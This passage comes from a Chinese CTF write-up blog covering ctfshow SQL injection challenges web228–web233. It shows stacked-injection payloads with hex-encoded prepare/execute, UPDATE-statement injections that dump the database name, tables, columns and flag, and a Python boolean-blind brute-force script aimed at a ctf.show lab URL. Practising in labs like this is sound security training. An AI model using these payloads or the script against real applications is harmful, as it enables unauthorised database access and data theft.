src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112134915492.png" alt="image-20250112134915492"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare test from select flagasba from ctfsh_ow_flagasaa;execute test;#</span></span><br><span class="line"><span class="string">username=0&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112135111381.png" alt="image-20250112135111381"></p><h2 id="web229-堆叠注入-黑盒过滤"><a href="#web229-堆叠注入-黑盒过滤" class="headerlink" title="web229(堆叠注入+黑盒过滤)"></a>web229(堆叠注入+黑盒过滤)</h2><p>同上,爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare test from show tables;execute test;#</span></span><br><span class="line"><span class="string">username=0&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f77207461626c6573</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112135623089.png" alt="image-20250112135623089"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare test from show columns from flag;execute test;#</span></span><br><span class="line"><span class="string">username=0&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73686f7720636f6c756d6e732066726f6d20666c6167</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112135741130.png" alt="image-20250112135741130"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare test from select flagasba from flag;execute test;#</span></span><br><span class="line"><span class="string">?username=0&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c65637420666c6167617362612066726f6d20666c6167</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112135851352.png" alt="image-20250112135851352"></p><h2 id="web230-堆叠注入-黑盒过滤"><a href="#web230-堆叠注入-黑盒过滤" class="headerlink" title="web230(堆叠注入+黑盒过滤)"></a>web230(堆叠注入+黑盒过滤)</h2><p>过程同上，表名flagaabbx，列名flagasbas</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;prepare test from select flagasbas from flagaabbx;execute test;#</span></span><br><span class="line"><span class="string">username=0&#x27;</span>;<span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="number">0x73656c65637420666c616761736261732066726f6d20666c61676161626278</span>;<span class="keyword">execute</span> test;#</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112140520044.png" alt="image-20250112140520044"></p><h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><h2 id="web231-无过滤"><a href="#web231-无过滤" class="headerlink" title="web231(无过滤)"></a>web231(无过滤)</h2><p>先观察查询语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>则有两种方法，一种直接闭合查询，一种通过布尔或者时间盲注查找(注意这里通过向&#x2F;api&#x2F; POST传参)</p><h3 id="法一-直接闭合"><a href="#法一-直接闭合" class="headerlink" title="法一:直接闭合"></a>法一:直接闭合</h3><p>构造payload为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;,username=database()#</span></span><br></pre></td></tr></table></figure><p>将该payload填入查询语句即为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;update ctfshow_user set pass = &#x27;2&#x27;,username=database()#&#x27; where username = &#x27;1&#x27;;&quot;;</span><br><span class="line">该语句的password部分将查询语句前方单引号闭合且把后面限定条件注释，同时updata username为数据库名称，使得更新后刷新页面显示用户名为数据库名称，密码为<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112142400410.png" alt="image-20250112142400410"></p><p>接下来就是相同步骤(注意使用子查询语句，即添加括号，不然出错 )</p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;);#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112143051662.png" alt="image-20250112143051662"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="string">&#x27;);#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112143221177.png" alt="image-20250112143221177"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;,username=(select flagas from flaga);#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112143317795.png" alt="image-20250112143317795"></p><h3 id="法二-布尔盲注"><a href="#法二-布尔盲注" class="headerlink" title="法二:布尔盲注"></a>法二:布尔盲注</h3><p>通过username为注入点，构造payload如下</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span><span class="number">0</span><span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(substr(database(),1,1)=&#x27;</span>c<span class="string">&#x27;,true,false);#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112145156996.png" alt="image-20250112145156996"></p><p>通过回显来判断是否正确，贴个自己写的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += char</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，库名为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force1</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += char</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，表名为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span>      </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force2</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += char</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，列名为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force3</span>(<span class="params">url</span>):</span><br><span class="line">    x= <span class="number">0</span></span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span>+<span class="string">f&quot;&#x27; or if(ascii(substr((select <span class="subst">&#123;column&#125;</span> from <span class="subst">&#123;table&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;char&#125;</span>,true,false);#&quot;</span>&#125;   </span><br><span class="line">         r = requests.post(url=url,data=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">r&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += <span class="built_in">chr</span>(char)</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            x+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         x+=<span class="number">1</span></span><br><span class="line">         <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="comment">#指定url</span></span><br><span class="line">   url=<span class="string">&#x27;http://eca773f7-0f80-4cfc-8543-ef0009ac1609.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">   database=force(url)</span><br><span class="line">   force1(url)</span><br><span class="line">   table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">   force2(url)</span><br><span class="line">   column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">   force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112162832777.png" alt="image-20250112162832777"></p><p><strong>注意！！！！</strong>调试了半下午的脚本，发现最终错在这两个语句的辨析，下面语句是对的，上面语句是错的，原因就在于f”string”，双引号中的内容转换为字符串，因此加号实现的拼接操作失效了，导致这个语句出错</p><p>脚本运行结果如下</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112172347904.png" alt="image-20250112172347904"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112172838748.png" alt="image-20250112172838748"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112172854419.png" alt="image-20250112172854419"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250112172902836.png" alt="image-20250112172902836"></p><h2 id="web232-更改闭合方式"><a href="#web232-更改闭合方式" class="headerlink" title="web232(更改闭合方式)"></a>web232(更改闭合方式)</h2><p>在查询语句中发现对传入的password要进行MD5编码，将闭合换为’)即成功闭合，类似于web216</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113130629674.png" alt="image-20250113130629674"></p><h3 id="法一-直接闭合-1"><a href="#法一-直接闭合-1" class="headerlink" title="法一:直接闭合"></a>法一:直接闭合</h3><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;),username=database()#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113131240222.png" alt="image-20250113131240222"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113131415485.png" alt="image-20250113131415485"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flagaa<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113131828960.png" alt="image-20250113131828960"></p><p>爆flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">2</span><span class="string">&#x27;),username=(select flagass from flagaa)#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113131905536.png" alt="image-20250113131905536"></p><h3 id="法二-布尔盲注-1"><a href="#法二-布尔盲注-1" class="headerlink" title="法二:布尔盲注"></a>法二:布尔盲注</h3><p>直接贴脚本吧，只用改url</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def force(url):</span><br><span class="line">    x<span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    find<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char<span class="operator">=</span><span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> <span class="type">char</span> <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:#根据需要更改字典</span><br><span class="line">         payload <span class="operator">=</span> &#123;<span class="string">&#x27;password&#x27;</span> : f&quot;&#123;x&#125;&quot;,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span><span class="operator">+</span>f&quot;&#x27; or if(substr(database(),&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;,true,false);#&quot;&#125;   </span><br><span class="line">         r <span class="operator">=</span> requests.post(url<span class="operator">=</span>url,data<span class="operator">=</span>payload).text</span><br><span class="line">         </span><br><span class="line">         if(r<span class="string">&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find <span class="operator">+</span><span class="operator">=</span> <span class="type">char</span></span><br><span class="line">            print(find)</span><br><span class="line">            found_char <span class="operator">=</span> <span class="literal">True</span></span><br><span class="line">            x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">            break</span><br><span class="line">      if <span class="keyword">not</span> found_char:</span><br><span class="line">         print(&quot;未找到更多字符，库名为&quot;<span class="operator">+</span>find)</span><br><span class="line">         x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">         break</span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line">    </span><br><span class="line">def force1(url):</span><br><span class="line">    x<span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    find<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char<span class="operator">=</span><span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> <span class="type">char</span> <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:#根据需要更改字典</span><br><span class="line">         payload <span class="operator">=</span> &#123;<span class="string">&#x27;password&#x27;</span> : f&quot;&#123;x&#125;&quot;,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span><span class="operator">+</span>f&quot;&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;database&#125;&#x27;),&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;,true,false);#&quot;&#125;   </span><br><span class="line">         r <span class="operator">=</span> requests.post(url<span class="operator">=</span>url,data<span class="operator">=</span>payload).text</span><br><span class="line">         </span><br><span class="line">         if(r<span class="string">&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find <span class="operator">+</span><span class="operator">=</span> <span class="type">char</span></span><br><span class="line">            print(find)</span><br><span class="line">            found_char <span class="operator">=</span> <span class="literal">True</span></span><br><span class="line">            x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">            break</span><br><span class="line">      if <span class="keyword">not</span> found_char:</span><br><span class="line">         print(&quot;未找到更多字符，表名为&quot;<span class="operator">+</span>find)</span><br><span class="line">         x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">         break      </span><br><span class="line"></span><br><span class="line">def force2(url):</span><br><span class="line">    x<span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    find<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char<span class="operator">=</span><span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> <span class="type">char</span> <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz123456789&#123;0_-,&#125;&#x27;</span>:#根据需要更改字典</span><br><span class="line">         payload <span class="operator">=</span> &#123;<span class="string">&#x27;password&#x27;</span> : f&quot;&#123;x&#125;&quot;,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span><span class="operator">+</span>f&quot;&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;&#123;table&#125;&#x27;),&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;,true,false);#&quot;&#125;   </span><br><span class="line">         r <span class="operator">=</span> requests.post(url<span class="operator">=</span>url,data<span class="operator">=</span>payload).text</span><br><span class="line">         </span><br><span class="line">         if(r<span class="string">&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find <span class="operator">+</span><span class="operator">=</span> <span class="type">char</span></span><br><span class="line">            print(find)</span><br><span class="line">            found_char <span class="operator">=</span> <span class="literal">True</span></span><br><span class="line">            x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">            break</span><br><span class="line">      if <span class="keyword">not</span> found_char:</span><br><span class="line">         print(&quot;未找到更多字符，列名为&quot;<span class="operator">+</span>find)</span><br><span class="line">         x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">         break  </span><br><span class="line"></span><br><span class="line">def force3(url):</span><br><span class="line">    x<span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    find<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">      found_char<span class="operator">=</span><span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> <span class="type">char</span> <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">128</span>):#根据需要更改字典</span><br><span class="line">         payload <span class="operator">=</span> &#123;<span class="string">&#x27;password&#x27;</span> : f&quot;&#123;x&#125;&quot;,<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;0&#x27;</span><span class="operator">+</span>f&quot;&#x27; or if(ascii(substr((select &#123;column&#125; from &#123;table&#125;),&#123;i&#125;,1))=&#123;char&#125;,true,false);#&quot;&#125;   </span><br><span class="line">         r <span class="operator">=</span> requests.post(url<span class="operator">=</span>url,data<span class="operator">=</span>payload).text</span><br><span class="line">         </span><br><span class="line">         if(r<span class="string">&#x27;\u66f4\u65b0\u6210\u529f&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find <span class="operator">+</span><span class="operator">=</span> chr(<span class="type">char</span>)</span><br><span class="line">            print(find)</span><br><span class="line">            found_char <span class="operator">=</span> <span class="literal">True</span></span><br><span class="line">            x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">            break</span><br><span class="line">      if <span class="keyword">not</span> found_char:</span><br><span class="line">         print(&quot;未找到更多字符,flag为&quot;<span class="operator">+</span>find)</span><br><span class="line">         x<span class="operator">+</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">         break  </span><br><span class="line"></span><br><span class="line">if __name__ <span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">   #指定url</span><br><span class="line">   url<span class="operator">=</span><span class="string">&#x27;http://eca773f7-0f80-4cfc-8543-ef0009ac1609.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">   database<span class="operator">=</span>force(url)</span><br><span class="line">   force1(url)</span><br><span class="line">   <span class="keyword">table</span><span class="operator">=</span>input(&quot;请输入表名:&quot;)</span><br><span class="line">   force2(url)</span><br><span class="line">   <span class="keyword">column</span><span class="operator">=</span>input(&quot;请输入列名:&quot;)</span><br><span class="line">   force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113134754189.png" alt="image-20250113134754189"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113135949025.png" alt="image-20250113135949025"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113135955074.png" alt="image-20250113135955074"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113142457677.png" alt="image-20250113142457677"></p><h2 id="web233-过滤单引号"><a href="#web233-过滤单引号" class="headerlink" title="web233(过滤单引号)"></a>web233(过滤单引号)</h2><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250113145106795.png" alt="image-20250113145106795"></p><p>测试payload后发现<code>\u67e5\u8be2\u5931\u8d25</code>(查询失败),尝试更改注释符也失败，即可能是单引号被过滤了</p><p>尝试十六进制后注入不进去，看了wp发现一种巧妙解法如下</p><h3 id="法一-直接闭合-2"><a href="#法一-直接闭合-2" class="headerlink" title="法一:直接闭合"></a>法一:直接闭合</h3><p>查询语句为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>此时传入payload为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password<span class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p>插入查询语句即为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span 